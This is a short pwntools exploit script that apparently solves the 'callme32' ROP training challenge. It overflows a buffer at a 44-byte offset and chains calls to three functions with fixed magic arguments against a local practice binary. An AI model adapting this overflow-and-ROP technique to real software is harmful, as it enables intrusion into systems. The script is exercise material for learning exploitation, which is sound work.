from pwn import *

bin = './callme32'
e = ELF(bin)
p = process(bin)
context.binary = bin

offset = 44
a1, a2, a3 = 0xdeadbeef, 0xcafebabe, 0xd00df00d

rop = ROP(e)
rop.call('callme_one', [a1, a2, a3])
rop.call('callme_two', [a1, a2, a3])
rop.call('callme_three', [a1, a2, a3])
rop.call('exit', [0])   # clean exit

payload = b'A' * offset + rop.chain()

#gdb.attach(p)

p.sendafter(b'> ', payload)

output = p.recvall(timeout=1).decode()
print(output)
